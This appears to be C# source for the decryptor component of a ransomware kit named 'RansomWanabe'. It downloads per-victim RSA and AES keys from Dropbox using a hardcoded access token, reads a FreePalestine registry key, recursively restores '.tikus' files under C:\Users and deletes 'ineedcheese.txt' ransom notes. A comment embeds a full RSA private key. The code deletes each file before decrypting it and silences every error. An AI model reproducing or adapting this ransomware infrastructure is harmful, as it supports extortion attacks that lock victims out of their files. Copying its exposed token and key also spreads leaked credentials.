using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Dropbox.Api;
using Microsoft.Win32;

namespace RansomWanabe
{
    public class Dropbox
    {
        public static string token = "PnVBRiPB-vQAAAAAAAAAAXQgy33NH-zcV0O_NaoOe_8ZZhb985g6yJ5vHmHAf450";

        public static async Task<byte[]> DownloadFile(string folder, string file)
        {
            using (DropboxClient dbx = new DropboxClient(token))
            {
                var remoteFilePath = "/" + folder + "/agent_tikus_storage/" + file;
                using (var response = await dbx.Files.DownloadAsync(remoteFilePath))
                {
                    var s = response.GetContentAsByteArrayAsync();
                    s.Wait();
                    var d = s.Result;
                    return d;
                }
            }
        }
    }

    public class Asymmetric
    {

        public class RSA
        {
            /// <summary>
            /// Create a public and private key.
            ///
            /// The RSACryptoServiceProvider supports key sizes from 384
            /// bits to 16384 bits in increments of 8 bits if you have the
            /// Microsoft Enhanced Cryptographic Provider installed. It
            /// supports key sizes from 384 bits to 512 bits in increments
            /// of 8 bits if you have the Microsoft Base Cryptographic
            /// Provider installed.
            /// </summary>
            /// <param name="publicKey">The created public key.</param>
            /// <param name="privateKey">The created private key.</param>
            /// <param name="keySize">Size of keys.</param>
            public static void CreateKeys(out string publicKey, out string privateKey, int keySize = 4096)
            {
                publicKey = null;
                privateKey = null;

                var csp = new CspParameters
                {
                    ProviderType = 1,
                    Flags = CspProviderFlags.UseArchivableKey,
                    KeyNumber = (int)KeyNumber.Exchange
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(keySize, csp);

                publicKey = rsa.ToXmlString(false);
                privateKey = rsa.ToXmlString(true);

                rsa.PersistKeyInCsp = false;
            }

            /// <summary>
            /// Encrypt data using a public key.
            /// </summary>
            /// <param name="bytes">Bytes to encrypt.</param>
            /// <param name="publicKey">Public key to use.</param>
            /// <returns>Encrypted data.</returns>
            public static byte[] Encrypt(byte[] bytes, string publicKey)
            {
                var csp = new CspParameters
                {
                    ProviderType = 1
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);

                rsa.FromXmlString(publicKey);
                var data = rsa.Encrypt(bytes, false);

                rsa.PersistKeyInCsp = false;

                return data;
            }

            /// <summary>
            /// Encrypt data using a public key.
            /// </summary>
            /// <param name="input">Data to encrypt.</param>
            /// <param name="publicKey">Public key to use.</param>
            /// <returns>Encrypted data.</returns>
            public static string Encrypt(string input, string publicKey)
            {
                if (input == null)
                {
                    throw new Exception("Input cannot be null");
                }

                return Convert.ToBase64String(
                    Encrypt(
                        Encoding.UTF8.GetBytes(input),
                        publicKey));
            }

            /// <summary>
            /// Decrypt data using a private key.
            /// </summary>
            /// <param name="bytes">Bytes to decrypt.</param>
            /// <param name="privateKey">Private key to use.</param>
            /// <returns>Decrypted data.</returns>
            public static byte[] Decrypt(byte[] bytes, string privateKey)
            {
                var csp = new CspParameters
                {
                    ProviderType = 1
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);

                rsa.FromXmlString(privateKey);
                var data = rsa.Decrypt(bytes, false);

                rsa.PersistKeyInCsp = false;

                return data;
            }

            /// <summary>
            /// Decrypt data using a private key.
            /// </summary>
            /// <param name="input">Base64 data to decrypt.</param>
            /// <param name="privateKey">Private key to use.</param>
            /// <returns>Decrypted data.</returns>
            public static string Decrypt(string input, string privateKey)
            {
                if (input == null)
                {
                    throw new Exception("Input cannot be null");
                }

                return Encoding.UTF8.GetString(
                    Decrypt(
                        Convert.FromBase64String(input),
                        privateKey));
            }
        }
    }

    public class GetKey
    {
        public static RegistryKey LocalReg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\FreePalestine");

        public static string GetPublicKey()
        {
            var publicKey = File.ReadAllText(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "public.key"));
            return publicKey;
        }

        public static string GetPrivateKey(string uid)
        {
            //get key online
            Task<byte[]> task = Task.Run(() => Dropbox.DownloadFile(uid, "private.key"));
            task.Wait();

            var privateKey = Encoding.UTF8.GetString(task.Result);

            //var SPrivKey = @"<RSAKeyValue><Modulus>vHOJKxH574XOQ2hD3szun+rGaAfJXKRgYcPT9+dopFNQrrXlSuPDxxlaQUj/KZAOzg0tcjZK9Up8VIZo2t6nLtOAtBhm/52BO0KmTIFuqjehX6X2F0qB9HnxhZea1tuF1vb1lj9UZ6zMMCotnIuCC8gfftCwglsosFex1gOM58I8NQvYgOleDt2WzpIUp/ZIIxZpNjVHYrbDLRbgB5TPNzj3mwVMAz2hqROEG0MCNS+/qwPNCccsO7CkdkX89tKXZVN2iuCdbSZ6Z0MflVbC4TGiFbjY51JNJoiGfaUO3nn1wH1kduhUB1bDkNTEL7TcDLR9lizKw6idxb31gCciazQ6mDgYOFF0WRtkQ7pi4MJGiFkrhxMPXNfz8iJlDaJxH32SggdEBzze4TKNK4yjuazE4UqEQPmwgAnA7uHKSBJq9kQMyJKpWfSucyQssjio5f3M50O8VMm48pQCb8PWLSZe1cPAocP7HujZLEOdkRlCkuiXY+uZ+HLB+XGk/25vOJPvGSVYDC/jHDyADD2D1YgD6hlCqeeVlYSP0iJrtP9gP1GSYSBccF1v1nxr5EWrSMfH2Rdv91Bq1EaT0whXQTvgHnbvckwGXDWAIG9SPkpR4BCapZ7cPC3kfqFuky1NFLWrH+lUNyypin5tM6o+74I1uU26jXihEYyaKz6Rzp0=</Modulus><Exponent>AQAB</Exponent><P>2n6aj5djXViU1sJkrZxJbYJKCXCvv2a5pt0iXgdlvhyrrJaL7YIH9Gkxw40W07l7TGNe8Vr2UX+yYWggymMqcQEnv7nkiftI2cCU00u+Nvi5dw2uxAvwT/qF+vcDYNl357K3MnHl0TUEsuVZym3AxMOs4mhdtEx/FAuhw9SQOTig8IgIo/XMcvJw6mU/hBsKdGVc3cWjxErlPNsFzrmK4axqdNXhae3SZQ6wiQzPqBW0jX1FJf4X4Iw5AqnUZUl+hlAxZnwpE7NTntMr1BXwWO5RHftb4SnBVcQ0EpTHSXb86ZNeYfiqc3dK/Mx1NTi6zDle/TcFB/LxHWHcFztEOw==</P><Q>3My604HTWtsta/Sv/NoUcL78nAq2xBAy69adJ/9eKdHzBRI7bZYBD2VuqrIUapM4JQxJAobNXYBdBzFYPgCk4POdt54IMXWVRO7sV9RpWGBProu17l1fnEJm80hP8n9QXCWujStLnlYr4MEJuvGsSpfV9xmoUEB3LKWhPon6K2ywYWxYXXGtrIh2G6lPxjqp1puUJ4AS3IcK8YyFMDoUs+dU8B0mNyw9aA3nSIYEwlACrboolTXZCsAeRIGPsh8y6bGSpQ2R/qvVYXD0PjUI31iyEdpwtzFUyGccLv3p77xgMiiHJhP1nK8v4t7f+RFOWNlzoA6egopB0MxnN07DBw==</Q><DP>LprQpw44kKGjZcejJ/DtLKGc3zSdGCt2MCR8/yd+yTVeXPrjr+6LedOyXK7Mjq7CoQGVL9AiODIPv30xeVn7pI0FiHzDRbdGy8OrOwKt+RXGoaFWhNSzFqwuReDIZLEeRVq2ftkSlzRC41HOfEI62v2N8+ElE585f/IXOCkv9jShB41MooR8boxOD4E3Mht+eGNikp9klisPiJKDQ5wKBqb7Mh6o7SpgNVQTzbfg106B66grxrXTK/9c7beB6XTquwWB9AVJ0bzvejI66Ash8CYtQULrTzTT21J1dP0tIPtzaPMZL7aVzPlGEnQeEBMgrQ0TuNkyhoaIbacBBieLHw==</DP><DQ>d017yRrF67qv0TwV90aSctUPQvUbCddC3GFK6zi1VV1mtR/D0pORoRMKd9re4zMGzCXWMTJLNrFMEr3b0yyf6hhX6MXP4YGKFQQP2ekgvqrTgxlkRRZYueK7I8q3v+yArDmEFi0Fn9kpvjgvnL5GfMuLxgcsBai/e/VGqbb94IbKyuky2dK5p5bYUlvqic5axGWt6KXwCw5AoIFv2b4YP5jIMTFe28Lgrx+MD4iye5elyt7iXLUKwB9Me3GSBgmLhe/3r40kjHmmQw84OYCIeb3AAZuI+cMC74GfHdj+lRWw2IlDdRSlynJyKmCInlh2f9WG/z3G8fvoUfyP7Ld28w==</DQ><InverseQ>moicL0IqF/Z22ZMvk2Oorn5c/XFDhVm61B5zRg7uBQnBWyAa/JVZ32a9tOq+0vOLpWRsaoACRpuBr8ymQnxU8Ml4rQDJl4g2nC5AoeHqNX8tMZGJ6egCosY3t9oExn21cpGDORkzIcIoo9XQrDwmM+II9cFXrJKVEzyn7DJzY9RQ2kH+mBNc9rrhPWPuKqt3zGmY5j5i4NP/4JCVnkrMJj18C9oiNcPVrEsR2QtsuXJwvv+Zwhs7v+QqAXkzk5qu65iGp8aEpi23OMJmMeoHg6UKfyEY0jL8Qd/AuDyscXsjJi6C9MHSEdK5TmizmpUY+1Sucwx+OZjxc4fJIO4kow==</InverseQ><D>oWYOR54IwlSGGIM3BZ3cjYfkz3pDwh1iErlGVJ6Tp5FXm5pbu+0gYufavelH6A/iLiVpE9VeE4DsxPOs4C8rXlZ0d0ojBK+f2+I0TXfZEN2+Tw3zm3ULohfCe9khGv0+PqKaKUkp//Ull+a308hD49VM7C7NzYdHbOhefd3ikyduqzvu/FFiZjbwDxFbsZKjq7FpAK1W6zt+I6Lg0n1nj3Mx1UoPFQN27jixvyt/u4+eh1glBkfYIXMjF8zPX5Fzaqu17jF7gt0enkwFw8Bf/cClghcjZdK+Es+A6CEyf+ZSTL7YCWLnfLWZnvQq5nTutc7rdG/+ZN6H6bDMjyp1NYVz4XhMwtC/WbJPeOwZcuzZd7DumqSBOT6GQhJcSqb7WFXMYz1MHFpBCkdWSrrNm5+7WPVTCx2pyXysMCm2spqbXyYji9ljHeRkilbzn9psdMeSLjRKtvL+YlParAPH0VyVKWDR/UXD64p6iSUuUW1NwRo6AYd+Q7AfUjAxVtHAY1jF42mcg2yb418yiYI4suzvG+Y7kRu9OmB09KBzG1vWcoV04JC2h790HEr0xrjUd1i848ZF/nAiUYnppoKgvvUrBaPPpMIy6g+gyOrj7AsM1KmIzhrdB30V65rb1kRatj2XfxeL2ebodLtSbTsavyVrW8orB6MWg3aJEkcoUl0=</D></RSAKeyValue>";
            //var privateKey = Asymmetric.RSA.Decrypt(encprivateKey, SPrivKey);

            //var privateKey = File.ReadAllText(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "private.key"));
            //var privateKey = Encoding.UTF8.GetString(privKey);

            return privateKey;
        }

        public static byte[] GetAESKey(string uid)
        {
            byte[] aeskey = { };
            if(LocalReg != null)
            {
                aeskey = (byte[])LocalReg.GetValue("aesKey");
            }
            else
            {
                Task<byte[]> task = Task.Run(() => Dropbox.DownloadFile(uid, "aes.key"));
                task.Wait();
                aeskey = task.Result;
            }

            //var aeskey = File.ReadAllBytes(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "aes.key"));
            //var aeskey = Encoding.UTF8.GetString(privKey);

            return aeskey;
        }

        public static byte[] GetAESIV(string uid)
        {
            byte[] aesiv = { };
            if (LocalReg != null)
            {
                aesiv = (byte[])LocalReg.GetValue("aesIV");
            }
            else
            {
                Task<byte[]> task = Task.Run(() => Dropbox.DownloadFile(uid, "aes.iv"));
                task.Wait();

                aesiv = task.Result;
            }
            //var aesiv = File.ReadAllBytes(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "aes.iv"));
            return aesiv;
        }
    }

    public class AES
    {
        public static byte[] AESDecrypt(byte[] cipherData, byte[] aes_key, byte[] aes_iv)
        {

            MemoryStream ms = new MemoryStream();

            Rijndael alg = Rijndael.Create();

            alg.Key = aes_key;
            alg.IV = aes_iv;

            CryptoStream cs = new CryptoStream(ms,
                alg.CreateDecryptor(), CryptoStreamMode.Write);

            cs.Write(cipherData, 0, cipherData.Length);

            cs.Close();

            byte[] decryptedData = ms.ToArray();

            return decryptedData;
        }
    }

    class Program
    {
        public static readonly string userName = Environment.UserName;
        public static readonly string uid = $"{Environment.MachineName}-{userName}";

        public static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
            {
                dstream.CopyTo(output);
            }
            return output.ToArray();
        }

        public static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner
                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        private static readonly string ransomFormat = ".tikus";
        private static Dictionary<DirectoryInfo, List<string>> validDirs = new Dictionary<DirectoryInfo, List<string>>();
        private static List<string> logger = new List<string>();
        static void RecursiveSearch(string root)
        {
            string[] files = null;
            string[] subDirs = null;

            // First, process all the files directly under this folder 
            try
            {
                files = Directory.EnumerateFiles(root).Where(x => Path.GetExtension(x).Equals(ransomFormat)).ToArray();
            }
            catch (UnauthorizedAccessException e)
            {
                logger.Add(e.Message);
            }
            catch (System.IO.DirectoryNotFoundException e)
            {
                Console.WriteLine(e.Message);
            }

            if (files != null)
            {

                validDirs.Add(new DirectoryInfo(root), files.ToList());
                subDirs = Directory.GetDirectories(root);

                foreach (string dir in subDirs)
                {
                    RecursiveSearch(dir);
                }
            }
        }

        static void Main(string[] args)
        {

            //var publicKey = GetKey.GetPublicKey();
            var baseDir = $@"C:\Users";

            //var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            if(!IsElevated)
            {
                Console.WriteLine("Make sure to run this as administrator");
            }
            else
            {
                if (Directory.Exists(baseDir))
                {
                    try
                    {
                        
                        var privateKey = GetKey.GetPrivateKey(uid);

                        byte[] aes_key = Asymmetric.RSA.Decrypt(GetKey.GetAESKey(uid), privateKey);

                        //Console.WriteLine("yang aku dapat: " +Encoding.UTF8.GetString((byte[])GetKey.LocalReg.GetValue("aesKey")));
                        //Console.WriteLine("sepatutnya: " + Encoding.UTF8.GetString(GetKey.GetAESKey(uid)));

                        byte[] aes_iv = Asymmetric.RSA.Decrypt(GetKey.GetAESIV(uid), privateKey);

                        RecursiveSearch(baseDir);

                        //decrypt with this
                        foreach (var dir in validDirs.Values)
                        {
                            foreach (var file in dir)
                            {
                                //Console.WriteLine(file);
                                var decryptedFile = Path.GetFileNameWithoutExtension(file);
                                var outputFile = Path.Combine(Path.GetDirectoryName(file), Path.GetFileNameWithoutExtension(file));
                                var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";

                                if (!File.Exists(decryptedFile))
                                {
                                    var fileContent = File.ReadAllBytes(file);
                                    File.Delete(file);

                                    //var decrypted = Decompress(Asymmetric.RSA.Decrypt(fileContent, privateKey));
                                    try
                                    {
                                        var decrypted = AES.AESDecrypt(fileContent, aes_key, aes_iv);
                                        File.WriteAllBytes(outputFile, decrypted);

                                        if (File.Exists(ransomNotePath))
                                            File.Delete(ransomNotePath);

                                    }
                                    catch
                                    {
                                    }

                                }
                            }

                        }
                    }
                    catch
                    {
                    }
            
                }
            
            }

        }
    }
}
